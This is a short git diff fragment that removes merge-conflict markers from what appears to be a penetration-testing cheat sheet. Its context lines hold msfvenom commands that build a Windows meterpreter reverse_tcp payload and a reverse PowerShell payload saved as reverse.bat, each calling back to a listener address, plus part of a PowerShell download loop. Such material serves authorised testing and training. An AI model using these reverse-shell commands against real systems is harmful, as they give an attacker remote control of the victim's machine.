@@ -80,7 +80,7 @@ msfvenom –p windows/meterpreter/reverse_tcp lhost=192.168.1.104 lport=5555 pre
 
 
 
-=======
+
 powershell:
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=192.168.63.128 lport=3434 > reverse.bat 
@@ -103,4 +103,4 @@ foreach ($url in $urls) { ^
   } else { Write-Host 'File not found after download:' $fn } ^
 }"
 ```
->>>>>>> origin/main
+
